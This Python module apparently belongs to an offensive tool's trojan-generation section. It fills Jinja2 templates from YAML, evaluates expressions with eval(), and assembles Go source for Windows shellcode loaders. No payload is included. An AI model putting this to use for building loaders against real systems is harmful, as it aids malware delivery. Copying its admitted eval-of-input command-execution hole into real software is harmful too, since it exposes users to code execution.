from jinja2 import Template
from ClassCongregation import randoms,Binary,ShellCode
"http://docs.jinkan.org/docs/jinja2/templates.html"
def lookahead(iterable):#判断for循环是否是最后一个元素
    it = iter(iterable)
    last = next(it)
    for val in it:
        yield last, True
        last = val
    yield last, False
def Run(**kwargs):

    yaml_raw_data = kwargs.get("yaml_raw_data") #获取yaml的原始数据
    include = yaml_raw_data.get('include')  # 插件依赖
    function=yaml_raw_data.get('function') #插件函数
    #上述是必须使用的参数
    expression=yaml_raw_data.get('set') #插件表达式，内涵执行函数，会造成命令执行漏洞（
    state=yaml_raw_data.get('state') #获取声明值
    define=yaml_raw_data.get('define') #插件额外定义
    class_type=yaml_raw_data.get('class') #插件的类

    if expression is not None:
        placeholder = {}
        treated_function = []
        treated_class = []
        for i in expression:
            tmp = Template(expression[i])#进行模板替换表达式中的占位符
            replace=tmp.render(placeholder)#尝试进行替换，如果没有的占位符的话，就继续下一部
            placeholder[i] = eval(replace)
        for x in function:
            tmp = Template(x)
            treated_function.append(tmp.render(placeholder)) #处理占位符
        function=treated_function
        if class_type is not None:
            for a in class_type:
                tmp = Template(a)
                treated_class.append(tmp.render(placeholder))  # 处理占位符
            class_type= treated_class

    #函数拼接
    source_code ="package main\nimport (\n" #go代码的开头
    for x1,x2 in lookahead(include):#go代码的导入包
        if x2:
            source_code += "\""+x1+ "\""+ "\n"
        else:#如果是最后一个元素
            source_code += "\"" + x1 + "\""+")\n"
    for xx in define,state,class_type,function:
        if xx is not None:
            for x in xx:
                source_code += x+"\n"

    return source_code


# import yaml
# import time
# YamlRawData = yaml.safe_load(open("/Users/ascotbe/code/Medusa/Web/TrojanOrVirus/Modules/1630944000-Go-EXE-Windows-Null-No-ShellcodeLoader.yaml")) # 读取yaml文件
#
# A=Run(yaml_raw_data = YamlRawData,shellcode="\\x75\\x33") # 读取yaml文件)
# time.sleep(1)